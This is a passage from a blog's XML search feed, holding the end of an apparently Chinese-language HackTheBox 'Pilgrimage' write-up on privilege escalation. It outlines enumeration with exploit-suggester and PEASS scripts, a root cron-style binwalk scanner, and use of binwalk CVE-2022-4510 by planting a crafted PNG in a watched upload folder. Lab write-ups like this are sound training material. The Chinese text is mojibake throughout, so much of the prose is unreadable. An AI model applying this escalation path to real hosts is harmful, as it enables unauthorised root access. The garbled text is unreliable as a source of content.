href="#ææƒ" class="headerlink" title="ææƒ"></a>ææƒ</h3><p>å†…æ ¸å¾ˆæ–°ï¼Œsudoå’ŒSUIDä¹Ÿæ²¡å‘ç°å¯åˆ©ç”¨çš„</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_Zfg4pZC7_X.png" alt=""></p><p>ç›´æ¥ä¸Šææƒè„šæœ¬çœ‹çœ‹ï¼Œå…ˆçœ‹çœ‹æŸ¥CVEçš„linux-exploit-suggesterã€‚å¯¹æ¯”ä¸€ä¸‹å†…æ ¸ç‰ˆæœ¬ï¼Œæ²¡ä¸€ä¸ªé è°±çš„â€¦</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_HM0wzNqmPf.png" alt=""></p><p>å†çœ‹çœ‹PEASSï¼Œè¿™ä¸ªè„šæœ¬é›†æˆäº†éå¸¸å¤šLinuxææƒè„šæœ¬</p><p>åœ¨è§‚å¯Ÿè¿›ç¨‹çš„æ—¶å€™å‘ç°rootè¿è¡Œäº†malwarescan.shè„šæœ¬</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_TNR96o0YdF.png" alt=""></p><p>çœ‹çœ‹è„šæœ¬é‡Œéƒ½æ˜¯ä»€ä¹ˆå†…å®¹ï¼š</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_21Q1F8iW4m.png" alt=""></p><p>é€šè¿‡inotifywaitåˆ›å»ºäº†ä¸€ä¸ªå…³äº<code>/var/www/pilgrimage.htb/shrunk/</code> çš„ç›‘æ§ï¼Œä½¿ç”¨binwalkæå–æ–‡ä»¶å†…å®¹ã€‚çœ‹èµ·æ¥åƒæ˜¯ä¸ªç®€å•çš„WAFï¼Œä¸å…è®¸æ–‡ä»¶å†…å­˜åœ¨blacklistä¸­çš„å­—ç¬¦ä¸²</p><p>binwalkä¹Ÿæœ‰ä¸ªè‘—åçš„RCEæ¼æ´ï¼ˆCVE-2022-4510ï¼‰ï¼Œçœ‹çœ‹ç‰ˆæœ¬æ­£å¥½å¯ä»¥ä½¿ç”¨ï¼Œç¾æ»‹æ»‹</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_zd12AgkHVi.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_MtbG9AW8TR.png" alt=""></p><p>è¾“å…¥å‚æ•°è¿è¡Œè„šæœ¬ï¼Œå°±ä¼šç”Ÿæˆbinwalk_exploit.pngï¼Œå†ä¸Šä¼ åˆ°<code>var/www/pilgrimage.htb/shrunk/</code>ç›®å½•è®©rootè¿è¡Œbinwalkè§¦å‘å³å¯</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_ttjUd88fZV.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_z2qffOyWtE.png" alt=""></p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image_YSwZYSA_-S.png" alt=""></p><p>æ‹¿ä¸‹ï¼ä»Noobè¿›åŒ–æˆScript Kiddie</p><p><img src="https://blog-1302016477.cos.ap-nanjing.myqcloud.com/image__V0QBNzAgu.png" alt=""></p>]]></content>
    
    
    <categories>
      
      <category>Pentest</category>
      
    </categories>
    
    
    <tags>
      
      <tag>HackTheBox</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Remake</title>
    <link href="/2023/07/13/Remake/"/>
    <url>/2023/07/13/Remake/</url>
    
    <content type="html"><![CDATA[<p>Remakeâ€¦</p>]]></content>
    
    
    
    <tags>
      
      <tag>Remake</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
